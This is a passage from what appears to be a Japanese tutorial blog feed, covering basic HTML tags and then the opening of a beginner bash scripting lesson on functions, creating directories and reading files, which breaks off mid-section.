&lt;p>他のプログラムのようにHTML自体で何かを動かすということはできませんが、Web上でなにか公開すると、HTMLを使う必要が出てきます。&lt;/p>
&lt;h2 id="タグを覚えよう">タグを覚えよう&lt;/h2>
&lt;p>HTMLにはタグと呼ばれるものがあり、それぞれ意味を持っています。&lt;br>
「たくさんあって覚えられないよ」という人もいるかと思います。HTMLは覚えたらそれがすべてというわけではなく、年々更新されて、知らないようなタグが出てきたりします。&lt;br>
とはいっても、基本的なタグは変わりません。&lt;br>
ここでは基本的なタグを覚えてみましょう。&lt;/p>
&lt;p>覚え方はすごく簡単です。英語にしたときの頭文字だと思っておけば9割は覚えられました。&lt;br>
残りの1割程度は頭文字ではなく、単語の確率が高いです。&lt;br>
これでHTMLのタグはほぼほぼ覚えられました。&lt;br>
他の言語と違って、すごく簡単だと思いませんか？&lt;/p>
&lt;p>それでは主要なタグを見てみましょう。&lt;/p>
&lt;h3 id="ヘッドライン-h1-h2-h3-h4-h5-h6">ヘッドライン &lt;code>&amp;lt;h1&amp;gt; &amp;lt;h2&amp;gt; &amp;lt;h3&amp;gt; &amp;lt;h4&amp;gt; &amp;lt;h5&amp;gt; &amp;lt;h6&amp;gt;&lt;/code>&lt;/h3>
&lt;p>Headline（見出し）の頭文字&lt;code>h&lt;/code>を使ったタグです。&lt;/p>
&lt;p>文章を書く上で大事なのが&lt;code>h&lt;/code>タグです。&lt;code>h1&lt;/code>から&lt;code>h6&lt;/code>まであります。&lt;br>
&lt;code>h1&lt;/code>は最上位の見出しタグで、基本的にはサイト内に1つしか存在してはならないとされてます。&lt;br>
そのページのいちばん大事なタイトル部分に&lt;code>h1&lt;/code>を設定する事が多いです。&lt;br>
&lt;code>h2&lt;/code>は大見出し的な扱いです。h1よりも重要度は下がってきます。&lt;br>
&lt;code>h3&lt;/code>は小見出し的な扱いです。&lt;br>
そして、&lt;code>h4&lt;/code>、 &lt;code>h5&lt;/code>、&lt;code>h6&lt;/code>となっていきます。&lt;/p>
&lt;h3 id="文章-p">文章 &lt;code>&amp;lt;p&amp;gt;&lt;/code>&lt;/h3>
&lt;p>Paragraph（文章）の頭文字で、文章を表すタグが&lt;code>&amp;lt;p&amp;gt;&lt;/code>です。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">p&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>今日はいい天気だ。&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">p&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>とすることで、1つの文章になります。&lt;br>
段落を構成したい場合は、&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">p&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>今日はいい天気だ。&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">p&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">p&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>洗濯物もよく乾く。&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">p&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>と&lt;code>&amp;lt;p&amp;gt;&lt;/code>を続けて書いてやれば大丈夫です。&lt;/p>
&lt;h3 id="改行-br">改行 &lt;code>&amp;lt;br&amp;gt;&lt;/code>&lt;/h3>
&lt;p>さきほどの文章内で改行したいとなったときはBreak（壊す）の&lt;code>&amp;lt;br&amp;gt;&lt;/code>を使ってみましょう。&lt;br>
「いい天気だ」の「いい」という部分で改行したい場合は&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">p&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>今日は&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">br&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>いい天気だ。&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">p&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">p&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>洗濯物もよく乾く。&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">p&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>とすることで改行がされます。&lt;/p>
&lt;h3 id="リンク-a">リンク &lt;code>&amp;lt;a&amp;gt;&lt;/code>&lt;/h3>
&lt;p>次に、リンクを張りたい場合は、Anchor（いかり）のリンクの出発点や到達点を指定するタグ&lt;code>&amp;lt;a&amp;gt;&lt;/code>を使いましょう。&lt;/p>
&lt;p>&lt;code>&amp;lt;a&amp;gt;&lt;/code>タグは今までのタグと少し違い、属性と呼ばれる文字を追記する必要があります。&lt;br>
たとえば、googleにリンクを張りたいと思ったときは&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">a&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>リンクだよ&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">a&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>とするのではなく、&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">a&lt;/span> &lt;span class="na">href&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;https://google.com/&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>リンクだよ&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">a&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>とする必要があります。&lt;br>
この&lt;code>href&lt;/code>は「hypertext reference」の略です。日本語訳すると「参照」とかになるのでしょうか。&lt;br>
&lt;code>href&lt;/code>部分にはリンクしたいサイトのURLを貼り付けて、囲んだタグの中には表示したい文字列を入力します。&lt;/p>
&lt;h3 id="画像-img">画像 &lt;code>&amp;lt;img&amp;gt;&lt;/code>&lt;/h3>
&lt;p>Image（画像）はHTMLでも&lt;code>&amp;lt;img&amp;gt;&lt;/code>となってます。&lt;br>
このタグも前回のリンクと同じように属性が必要です。&lt;br>
画像に必要な属性は&lt;code>src&lt;/code>と&lt;code>alt&lt;/code>になります。&lt;br>
&lt;code>src&lt;/code>は「source（元）」の略で、画像のURLを入力します。&lt;br>
&lt;code>alt&lt;/code>は「alternate」の略です。日本語では「代替」となります。画像が何らかの原因で表示できなかったり、目の不自由な方に対して、その画像がどういったものなのかを記述することで、画像を表現できます。&lt;/p>
&lt;h3 id="箱的なもの-div">箱的なもの &lt;code>&amp;lt;div&amp;gt;&lt;/code>&lt;/h3>
&lt;p>&lt;code>div&lt;/code>はちょっと厄介で、今まで出てきたタグのように意味を持っていません。&lt;br>
しかし、このタグで囲ったものをグループとして機能させるようにできます。&lt;br>
divideやdivisionの略で、分割するという意味になります。&lt;/p>
&lt;p>たとえば、サイトを3つの構成に分けたいとしましょう。&lt;br>
その場合は、&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">h2&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>コンテンツ1&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">h2&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">h2&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>コンテンツ2&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">h2&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">h2&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>コンテンツ3&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">h2&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>などとすることが可能です。&lt;/p>
&lt;h3 id="リスト-ul-ol">リスト &lt;code>&amp;lt;ul&amp;gt; &amp;lt;ol&amp;gt;&lt;/code>&lt;/h3>
&lt;p>リスト形式の文章を作りたいときには&lt;code>&amp;lt;ul&amp;gt;&lt;/code>や&lt;code>&amp;lt;ol&amp;gt;&lt;/code>を使用します。&lt;br>
ulは「unordered list」の略で、順序がないリストと言う意味です。&lt;br>
olは「order list」の略で、順序があるリストと言う意味ですね。&lt;/p>
&lt;p>ulやolの中には&lt;code>&amp;lt;li&amp;gt;&lt;/code>というタグを記述します。&lt;br>
これは「list」を意味するタグです。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">ul&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">li&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>リスト1&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">li&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">li&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>リスト2&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">li&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">li&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>リスト3&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">li&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">ul&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">ol&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">li&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>リスト1&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">li&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">li&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>リスト2&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">li&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">li&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>リスト3&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">li&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">ol&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ulとolの違いは、ulの場合はliの頭に「・」が付き、olの場合は「数字」が付きます。&lt;/p>
&lt;p>以上が比較的よく使うHTMLタグになります。&lt;/p>
&lt;h2 id="まとめ">まとめ&lt;/h2>
&lt;p>すごく簡単でしたが、HTMLのタグの説明になります。&lt;br>
タグが多くて難しいと感じている方は、やりたいことを英語にしたときになんていうのかということを考えれば、HTMLタグに置き換えることができるのではないかと思います。&lt;br>
たとえば、文章を強調したいなと思ったとしたら、強調は強くしたいってことだから「strong」だよな。となります。&lt;br>
そして、HTMLには&lt;code>&amp;lt;strong&amp;gt;&lt;/code>という強調のためのタグが存在しています。&lt;/p>
&lt;p>また、ここは関係ないところだなというのは、脇に追いやっておきたいので、&lt;code>&amp;lt;aside&amp;gt;&lt;/code>というタグを使うことが可能です。&lt;/p>
&lt;p>このように、HTMLタグは自分がやりたいとを英語にしたときになんて言うのかさえわかってしまえば簡単に記述することが可能です。&lt;/p>
&lt;h2 id="オススメの書籍">オススメの書籍&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/%e3%80%90Amazon-co-jp-%e9%99%90%e5%ae%9a%e3%80%911%e5%86%8a%e3%81%a7%e3%81%99%e3%81%b9%e3%81%a6%e8%ba%ab%e3%81%ab%e3%81%a4%e3%81%8fHTML-CSS%e3%81%a8Web%e3%83%87%e3%82%b6%e3%82%a4%e3%83%b3%e5%85%a5%e9%96%80%e8%ac%9b%e5%ba%a7-DL%e7%89%b9%e5%85%b8-Flexbox/dp/4797398892/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-fe.ssl-images-amazon.com/images/I/51xAu2jeqrL.jpg" alt=" 【Amazon.co.jp 限定】1冊ですべて身につくHTML &amp;amp; CSSとWebデザイン入門講座 (DL特典: CSS Flexbox チートシート) ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> 【Amazon.co.jp 限定】1冊ですべて身につくHTML &amp;amp; CSSとWebデザイン入門講座 (DL特典: CSS Flexbox チートシート) &lt;/h2>
&lt;p>Web界隈やデザイナーに大人気!
Web関連の情報やデザインについて記事が学べる『Webクリエイターボックス』の管理人、
Manaによる渾身のHTML &amp;amp; CSSとWebデザインが学べる本&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/%e3%81%93%e3%82%8c%e3%81%a0%e3%81%91%e3%81%a7%e5%9f%ba%e6%9c%ac%e3%81%8c%e3%81%97%e3%81%a3%e3%81%8b%e3%82%8a%e8%ba%ab%e3%81%ab%e3%81%a4%e3%81%8f-HTML-Web%e3%83%87%e3%82%b6%e3%82%a4%e3%83%b31%e5%86%8a%e7%9b%ae%e3%81%ae%e6%9c%ac-Capybara-Design/dp/4798170119/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-na.ssl-images-amazon.com/images/I/51iJCT7O&amp;#43;YL.jpg" alt=" これだけで基本がしっかり身につく HTML/CSS&amp;amp;Webデザイン1冊目の本 ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> これだけで基本がしっかり身につく HTML/CSS&amp;amp;Webデザイン1冊目の本 &lt;/h2>
&lt;p> Webサイト制作をこれから学ぶ人へ送る
“1冊目&amp;#34;に最適の入門書! 【学びをサポートする4大特典つき】
&lt;p>本書は手を動かしてWebサイトを作りながら&lt;br>
HTML/CSSとWebデザインの基本を楽しく学べる入門書です。&lt;/p>
&lt;p>初学者が1冊目に読む本としてふさわしい内容を盛り込んでいるため、&lt;br>
これを読めば必要な基礎知識がひととおり身につきます。&lt;/p>&lt;br>
&lt;span class="link">Amazonで詳細を見る&lt;/span>&lt;br>
&lt;/div>&lt;br>
&lt;/a>&lt;br>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>&lt;/p>
&lt;/aside></description></item><item><title>【はじめから】ざっくりわかるシェルスクリプト３</title><link>https://suzukiiichiro.github.io/posts/2022-01-13-01-suzuki/</link><pubDate>Thu, 13 Jan 2022 11:26:13 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-13-01-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-13-01-suzuki/shellscript.jpg" alt="Featured image of post 【はじめから】ざっくりわかるシェルスクリプト３" />&lt;h2 id="はじめに">はじめに&lt;/h2>
&lt;p>Bashスクリプトは、シェルコマンドの実行、複数のコマンドの同時実行、管理タスクのカスタマイズ、タスクの自動化の実行など、さまざまな目的に使用できます。したがって、bashプログラミングの基本に関する知識はすべてのLinuxユーザーにとって重要です。この記事は、bashプログラミングの基本的な考え方を理解するのに役立ちます。ここでは、bashスクリプトの一般的な操作のほとんどを、非常に簡単な例で説明します。&lt;/p>
&lt;p>この記事では、bashプログラミングの次のトピックについて説明します。&lt;/p>
&lt;h2 id="関数からの戻り値の受け渡し">関数からの戻り値の受け渡し&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>関数からの戻り値の受け渡し：&lt;/b>&lt;/font>&lt;br>
Bash関数は、数値と文字列値の両方を渡すことができます。関数から文字列値を渡す方法を次の例に示します。&amp;lsquo;function_return.sh&amp;rsquo;という名前のファイルを作成し、次のコードを追加します。関数greeting（）は、文字列値を変数valに返します。この変数は、処理の最後に他の文字列と組み合わせて出力します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:function_return.sh" data-lang="bash:function_return.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">function&lt;/span> greeting&lt;span class="o">(){&lt;/span>
&lt;span class="nv">str&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;こんにちは、&lt;/span>&lt;span class="nv">$name&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$str&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;あなたの名前を入力して下さい&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">read&lt;/span> name&lt;span class="p">;&lt;/span>
&lt;span class="nv">val&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">$(&lt;/span>greeting&lt;span class="k">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;関数からの戻り値は「&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">val&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">」です。&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash function_return.sh
あなたの名前を入力して下さい
suzuki
関数からの戻り値は「こんにちは、suzuki」です。
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>戻り値について&lt;/dt>
&lt;dd>bashシェルスクリプトには「戻り値」というものは基本的に存在しない。&lt;/dd>
&lt;dd>
&lt;p>解決策として関数やコマンドの「実行結果を直接変数に代入する」という手段をとることになる。&lt;/p>
&lt;/dd>
&lt;dd>「return」コマンドは存在するが、あくまで終了ステータスを返しているだけで、関数の戻り値を返す機能ではないので注意しよう。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="ディレクトリを作成する">ディレクトリを作成する&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>ディレクトリを作成する：&lt;/b>&lt;/font>&lt;br>
Bashは「mkdir」コマンドを使用して新しいディレクトリを作成します。&amp;lsquo;make_directory.sh&amp;rsquo;という名前のファイルを作成し、次のコードを追加して、ユーザーから新しいディレクトリ名を取得します。ディレクトリ名が現在の場所に存在しない場合は、ディレクトリが作成されます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:make_directory.sh" data-lang="bash:make_directory.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;ディレクトリ名を入力して下さい。&amp;#34;&lt;/span>
&lt;span class="nb">read&lt;/span> newdir
&lt;span class="sb">`&lt;/span>mkdir &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$newdir&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="sb">`&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash make_directory.sh
ディレクトリ名を入力して下さい。
suzuki
$ ls
suzuki/
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>よく記述していたのは以下のようなコードでした。&lt;/dd>
&lt;dd>事前にディレクトリの存在チェックを行い、見つからなかった場合のみディレクトリを作成します。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:mkdir_example1.sh" data-lang="bash:mkdir_example1.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -d &lt;span class="s2">&amp;#34;/tmp/of/work&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">then&lt;/span>
: &lt;span class="c1"># 何もしない&lt;/span>
&lt;span class="k">else&lt;/span>
mkdir -p &lt;span class="s2">&amp;#34;/tmp/work&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;span class="nb">cd&lt;/span> &lt;span class="s2">&amp;#34;/tmp/of/work&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="存在を確認してディレクトリを作成する">存在を確認してディレクトリを作成する&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>存在を確認してディレクトリを作成します。&lt;/b>&lt;/font>&lt;br>
&amp;lsquo;mkdir&amp;rsquo;コマンドを実行する前に、現在の場所にディレクトリが存在することを確認する事ができます。mkdir コマンドの&amp;rsquo; -d &amp;lsquo;オプションは、特定のディレクトリが存在するかどうかをテストするためのオプションです。&amp;lsquo;directory_exist.sh&amp;rsquo;という名前のファイルを作成し、次のコードを追加してください。ディレクトリの存在を確認してディレクトリを作成します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:directory_exist.sh" data-lang="bash:directory_exist.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;ディレクトリ名を入力して下さい。&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">read&lt;/span> ndir&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -d &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$ndir&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;ディレクトリが存在します。&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="sb">`&lt;/span>mkdir &lt;span class="nv">$ndir&lt;/span>&lt;span class="sb">`&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;ディレクトリを作成しました。&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash directory_exist.sh
ディレクトリ名を入力して下さい。
suzuki
ディレクトリを作成しました。
$ ls
suzuki/
$ bash directory_exist.sh
ディレクトリ名を入力して下さい。
suzuki
ディレクトリが存在します。
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>実はディレクトリの存在チェックを行わなくても先のスクリプトは問題なく動作します。&lt;/dd>
&lt;dd>mkdir -p コマンドは以下のような挙動をします。&lt;/dd>
&lt;dd>
&lt;p>作成対象ディレクトリの親ディレクトリが存在しない場合 はすべての親ディレクトリを作成する&lt;/p>
&lt;/dd>
&lt;dd>作成対象ディレクトリがすでに存在している場合 は何も行わず、エラーもはかない&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:mkdir_example2.sh" data-lang="bash:mkdir_example2.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="c1"># 一旦ディレクトリを作成&lt;/span>
mkdir -p /tmp/work
ls -l -d /tmp/work/
&lt;span class="c1"># 出力&lt;/span>
&lt;span class="c1"># drwxr-xr-x 2 root root 64 Aug 22 08:26 /tmp/work/&lt;/span>
&lt;span class="c1"># オプション無しですでに存在しているディレクトリを作成&lt;/span>
mkdir /tmp/work
&lt;span class="c1"># 出力&lt;/span>
&lt;span class="c1"># mkdir: /tmp/work: File exists&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$?&lt;/span>
&lt;span class="c1"># 1&lt;/span>
&lt;span class="c1"># -pオプション有りだとエラーを吐かない&lt;/span>
mkdir -p /tmp/work
&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$?&lt;/span>
&lt;span class="c1"># 0&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash mkdir_example2.sh
drwxr-xr-x 2 suzukiiichiro wheel 64 1 21 13:13 /tmp/work/
mkdir: /tmp/work: File exists
1
0
$
&lt;/code>&lt;/pre>&lt;h2 id="ファイルを読む">ファイルを読む&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>ファイルを読む：&lt;/b>&lt;/font>&lt;br>
whileループでreadコマンドを使用すると、bashで任意のファイルを1行ずつ読み取ることができます。&amp;lsquo;read_file.sh&amp;rsquo;という名前のファイルを作成し、次のコードを追加してください。 別途作成する&amp;rsquo;book.txt&amp;rsquo;の内容を読み取ります。&lt;/p>
&lt;p>「book.txt」ファイルを作成します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ vim book.txt
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-:book.txt" data-lang=":book.txt">ファイルを読む：
ループを使用すると、bashで任意のファイルを1行ずつ読み取ることができます。
&amp;#39;read_file.sh&amp;#39;という名前のファイルを作成し、次のコードを追加して、&amp;#39;book.txt&amp;#39;という名前の既存のファイルを読み取ります。
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:read_file.sh" data-lang="bash:read_file.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">file&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;book.txt&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -f &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$file&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">then&lt;/span>
&lt;span class="k">while&lt;/span> &lt;span class="nb">read&lt;/span> line&lt;span class="p">;&lt;/span>&lt;span class="k">do&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$line&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">done&lt;/span>&amp;lt;&lt;span class="nv">$file&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$file&lt;/span>&lt;span class="s2"> ファイルがありません&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash read_file.sh
ファイルを読む：
ループを使用すると、bashで任意のファイルを1行ずつ読み取ることができます。
'read_file.sh'という名前のファイルを作成し、次のコードを追加して、'book.txt'という名前の既存のファイルを読み取ります。
&lt;/code>&lt;/pre>&lt;p>具体的に以下のファイルを作成してファイルを読み込み、必要な部分を抜き出して表示してみます。&lt;/p>
